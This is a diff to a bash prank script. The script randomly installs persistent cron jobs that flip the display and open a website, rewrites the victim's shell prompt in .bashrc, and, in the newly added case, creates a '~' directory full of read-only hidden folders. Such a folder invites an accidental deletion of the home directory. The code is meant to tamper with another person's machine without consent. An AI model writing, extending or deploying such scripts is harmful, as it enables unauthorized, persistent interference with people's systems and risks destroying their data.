@@ -21,7 +21,7 @@ RANDOM=`date '+%s'`
 # Semi-permanent prank
 for n in {1 .. $[($RANDOM % 3) + 1]}
 do
-    case $[$RANDOM % 11] in
+    case $[$RANDOM % 12] in
         0) # Mirror the display weekly
             crontab -l | sed "\$a\@weekly /usr/bin/xrandr --output $DEVICE --reflect xy" | crontab -
             ;;
@@ -68,8 +68,16 @@ do
         9) # Open beepdog daily
             crontab -l | sed "\$a\@daily nohup www-browser http://beepdog.us >> /dev/null &" | crontab -
             ;;
-        10) echo "export PS1='C:\${PWD//\//\\\\\\\\\\}> '" >> .bashrc
+        10) # Emulate DOS-prompt
+            echo "export PS1='C:\${PWD//\//\\\\\\\\\\}> '" >> .bashrc
             ;;
+        11) # Create ~-folder
+            mkdir ~/\~
+            for i in {1 .. 100}
+            do
+                mkdir ~/\~/.$i
+                chmod 0400 ~/\~/.$i
+            done
     esac
 done
 
